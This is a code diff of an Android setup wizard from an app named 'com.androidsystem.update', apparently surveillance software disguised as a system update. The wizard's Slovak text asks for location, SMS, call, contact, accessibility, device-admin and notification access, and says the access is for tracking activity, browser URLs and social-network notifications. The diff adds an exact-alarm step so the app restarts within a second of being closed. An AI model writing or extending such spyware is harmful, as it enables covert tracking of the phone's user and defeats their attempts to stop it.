@@ -34,6 +34,7 @@ import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
 import com.androidsystem.update.accessibility.AccessibilityServiceImpl
 import com.androidsystem.update.receiver.DeviceAdminReceiver
+import com.androidsystem.update.service.AlarmScheduler
 import com.androidsystem.update.service.CoreService
 import com.androidsystem.update.service.NotificationListener
 import kotlinx.coroutines.delay
@@ -91,7 +92,7 @@ private fun SetupWizardContent() {
     val steps = listOf(
         "Povolenie polohy", "Povolenie SMS a hovorov", "Povolenie kontaktov",
         "Povolenie štatistík používania", "Správca zariadenia", "Prístupnosť",
-        "Notifikácie", "Optimalizácia batérie", "Automatický štart", "Dokončenie"
+        "Notifikácie", "Optimalizácia batérie", "Presné budíky", "Automatický štart", "Dokončenie"
     )
 
     val stepDescriptions = listOf(
@@ -103,6 +104,7 @@ private fun SetupWizardContent() {
         "Pre sledovanie aktivít a získavanie URL z prehliadača.",
         "Pre sledovanie notifikácií zo sociálnych sietí.",
         "Vypnutie optimalizácie batérie pre spoľahlivý beh.",
+        "Povolenie presných budíkov — appka sa po zatvorení vráti do sekundy.",
         "Povolenie automatického štartu po reštarte.",
         "Všetko je nastavené. Spustenie služby."
     )
@@ -260,6 +262,16 @@ private fun SetupWizardContent() {
         }
     }
 
+    val alarmsLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        if (AlarmScheduler.canScheduleExact(context)) {
+            stepError = null; step++
+        } else {
+            stepError = "Presné budíky nie sú povolené"
+        }
+    }
+
     val autoStartLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { stepError = null; step++ }
@@ -350,6 +362,22 @@ private fun SetupWizardContent() {
                         data = Uri.parse("package:${context.packageName}")
                     }
                 )
+            }
+        },
+        {
+            // Android 12+ exact alarms (restart after swipe-away, watchdog)
+            // need the SCHEDULE_EXACT_ALARM special access. Android 14+ denies
+            // it by default for apps targeting API 33+, so request it here.
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S || AlarmScheduler.canScheduleExact(context)) {
+                stepError = null; step++
+            } else {
+                launchSafely {
+                    alarmsLauncher.launch(
+                        Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
+                            data = Uri.parse("package:${context.packageName}")
+                        }
+                    )
+                }
             }
         },
         {
